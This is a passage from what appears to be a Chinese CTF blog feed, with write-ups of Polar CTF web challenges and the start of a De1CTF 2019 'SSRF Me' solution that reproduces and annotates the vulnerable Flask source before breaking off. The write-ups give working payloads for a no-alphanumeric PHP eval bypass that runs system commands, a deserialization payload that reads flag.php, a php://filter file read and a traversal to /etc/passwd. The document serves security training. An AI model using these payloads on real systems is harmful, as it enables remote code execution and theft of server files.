class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-comment">//无数字字母绕过</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!&quot;</span>);<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xbr><br>POST:<br>_=system(&#x27;ls ./&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131600566.png" alt="image-20230923131600566"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#xx27;_&#xbr><br>POST:<br>_=system(&#x27;cat ./zheshiflag.php &#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131710886.png" alt="image-20230923131710886"></p><h4 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice:"></a>php very nice:</h4><p>构造序列化字符串:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$sys</span>=<span class="hljs-string">&#x27;Can you find the leak?&#x27;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;sys);<br>     &#125;<br> &#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$obj</span>-&gt;sys = <span class="hljs-string">&quot;system(&#x27;cat ./flag.php&#x27;);&quot;</span>;<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br><br> <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=O%3A7%3A%22Example%22%3A1%3A%7Bs%3A3%3A%22sys%22%3Bs%3A25%3A%22system%28%27cat+.%2Fflag.php%27%29%3B%22%3B%7D<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923162344694.png" alt="image-20230923162344694"></p><h4 id="代码审计1"><a href="#代码审计1" class="headerlink" title="代码审计1:"></a>代码审计1:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;|flag|&quot;</span>, <span class="hljs-variable">$xsx</span>)) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;flag is no here!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$xsx</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xsx&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$sys</span>(<span class="hljs-variable">$xsx</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=FilesystemIterator&amp;xsx=./<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923164401248.png" alt="image-20230923164401248"></p><p>使用php原生类返回flag.php的内容:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923172559963.png" alt="image-20230923172559963"></p><p><img src="/images/2023-9-24-Polar/image-20230923172610960.png" alt="image-20230923172610960"></p><h4 id="自由的文件上传系统："><a href="#自由的文件上传系统：" class="headerlink" title="自由的文件上传系统："></a>自由的文件上传系统：</h4><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=upload/../sectet_include.php<br>/var/www/html/upload/4382754064<br></code></pre></td></tr></table></figure><p>使用dirsearch：<br><img src="/images/2023-9-24-Polar/image-20230923155441868.png" alt="image-20230923155441868"></p><p><img src="/images/2023-9-24-Polar/image-20230923155509582.png" alt="image-20230923155509582"></p><p><img src="/images/2023-9-24-Polar/image-20230923155519918.png" alt="image-20230923155519918"></p><p>发现有.git泄露，但是.git泄露我没发现有用信息</p><p>.DS_Store:泄露也没有有用文件</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=../../../etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923180939030.png" alt="image-20230923180939030"></p><p>存在文件目录穿越，不过到最后也没有穿越出来。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[De1CTF 2019]SSRF Me 题解</title>
    <link href="/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/"/>
    <url>/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/</url>
    
    <content type="html"><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>1.查看提示:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102629610.png" alt="image-20230829102629610"></p><p>2.打开网页:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102651916.png" alt="image-20230829102651916"></p><p>观察代码，感觉是flask注入,整理代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br><br><br>            <span class="hljs-keyword">else</span>:<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>3.代码审计:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-comment"># 有参初始化一个Task对象</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        <span class="hljs-comment"># 将客户端的ip地址进行md5加密</span><br>        self.sandbox = md5(ip)<br>        <span class="hljs-comment"># 判断该ip地址是否存在</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            <span class="hljs-comment"># 如果该ip地址不存在，则为该ip地址创建一个目录，使该ip地址能够访问该网站文件</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 申请一个result字典</span><br>        result = &#123;&#125;<br>        <span class="hljs-comment"># &#123;&#x27;code&#x27;: 500&#125;</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-comment"># md5(secert_key + param + action)=sign</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                <span class="hljs-comment"># 打开result.txt文件，并用tmpfile指代该文件</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                <span class="hljs-comment"># 获取param路径下的文件内容，并存储到resp中</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 读取到param文件下的内容时，将该文件内容打印，但是该打印的内容无法呈现到网页中，只能呈现在编译器中</span><br>                    <span class="hljs-comment"># 所以无法利用其查看resp的内容</span><br>                    <span class="hljs-built_in">print</span>(resp)<br>                    <span class="hljs-comment"># 将读取的文件内容写入tmofile中</span><br>                    tmpfile.write(resp)<br>                    <span class="hljs-comment"># 关闭文件tmpfile</span><br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    <span class="hljs-comment"># 再次读取result.txt文件</span><br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    <span class="hljs-comment"># 将读取的文件内容存储到result字典中</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 如果action中没有scan则返回错误</span><br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 对该对象的action和param进行md5加密，判断加密结果和该对象的sign是否相等</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><span class="hljs-comment"># 访问url/geneSig时，该网页支持get和post请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    <span class="hljs-comment"># request.args.get()获取参数param的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># 设置参数action的值为scan</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-comment"># 执行getSign()函数</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># 访问url/De1ta时，该网页支持GET和POST请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    <span class="hljs-comment"># 从cookie中获取参数action的值</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    <span class="hljs-comment"># 从get方法中获取参数param的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># 从cookie中获取sign的值</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    <span class="hljs-comment"># ip存储客户端的ip地址</span><br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-comment"># 查看输入的param中是否存在非法字符</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    <span class="hljs-comment"># 有参数申请一个Task类，用task存储该对象</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-comment"># 返回一个json文件流到网页上，即显示task.Exec()文件内容</span><br>    <span class="hljs-comment"># 即显示result存储的内容</span><br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-comment"># 访问url/的网址时，执行index()函数</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># 打开并读取code.txt文件</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 读取param路径下的文件内容</span><br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-comment"># 返回secert_key + param + action的md5结果</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + 